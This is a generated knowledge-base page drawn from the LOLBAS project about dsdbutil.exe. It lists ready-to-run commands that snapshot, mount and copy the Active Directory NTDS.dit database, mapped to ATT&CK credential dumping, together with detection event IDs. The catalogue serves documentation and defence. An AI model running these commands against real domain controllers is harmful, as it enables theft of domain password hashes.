---
title: "dsdbutil.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Dsdbutil.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "dsdbutil.exe"
functions:
  - "Dump"
attack_technique_ids:
  - "T1003.003"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.

## Paths

- `C:\Windows\System32\dsdbutil.exe`
- `C:\Windows\SysWOW64\dsdbutil.exe`

## Commands

### 1. Dump

dsdbutil supports VSS snapshot creation

```cmd
dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
```

- Use Case: Snapshoting of Active Directory NTDS.dit database
- Privileges: Administrator
- Operating System: Windows Server 2012, Windows Server 2016, Windows Server 2019
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

### 2. Dump

Mounting the snapshot with its GUID

```cmd
dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
```

- Use Case: Mounting the snapshot to access the ntds.dit with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
- Privileges: Administrator
- Operating System: Windows Server 2012, Windows Server 2016, Windows Server 2019
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

### 3. Dump

Deletes the mount of the snapshot

```cmd
dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
```

- Use Case: Deletes the snapshot
- Privileges: Administrator
- Operating System: Windows Server 2012, Windows Server 2016, Windows Server 2019
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

### 4. Dump

Mounting with snapshot identifier

```cmd
dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
```

- Use Case: Mounting the snapshot identifier 1 and accessing it with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
- Privileges: Administrator
- Operating System: Windows Server 2012, Windows Server 2016, Windows Server 2019
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

### 5. Dump

Deletes the mount of the snapshot

```cmd
dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
```

- Use Case: deletes the snapshot
- Privileges: Administrator
- Operating System: Windows Server 2012, Windows Server 2016, Windows Server 2019
- ATT&CK: [[kb/attack/techniques/T1003-os_credential_dumping#^t1003003-ntds|T1003.003: NTDS]]

## Detections

- IOC: Event ID 4688
- IOC: dsdbutil.exe process creation
- IOC: Event ID 4663
- IOC: Regular and Volume Shadow Copy attempts to read or modify ntds.dit
- IOC: Event ID 4656
- IOC: Regular and Volume Shadow Copy attempts to read or modify ntds.dit

## Resources

- {'Link': 'https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358'}
- {'Link': 'https://www.netwrix.com/ntds_dit_security_active_directory.html'}

## Acknowledgements

- {'Person': 'bohop', 'Handle': '@bohops'}
- {'Person': 'Ekitji', 'Handle': '@eki_erk'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml)
